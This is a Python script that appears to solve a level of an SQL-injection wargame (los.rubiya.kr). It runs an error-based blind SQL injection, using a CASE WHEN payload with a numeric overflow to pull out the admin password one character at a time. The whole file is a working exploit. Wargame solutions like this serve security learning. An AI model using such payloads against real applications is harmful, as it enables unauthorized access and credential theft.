import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/frankenstein_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}

ans = ""

for  i in range(1, 100):
    for c in "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ_@#$^&*-+":
        res = requests.get(url, params={'pw': f'\' or id=\'admin\' and case when pw like \'{ans}{c}%\' then 1 else 9e307*2 end #'},cookies=cookie)
        if res.text.find("<hr><br>error") <= 0:
            ans += c
            print(ans)
            break
    print(f"Try {i} : {ans}")
    res = requests.get(url, params={'pw': ans},cookies=cookie)
    if res.text.find("Clear") > 0:
        print("Clear!")
        break
    else:
        print("Failed")

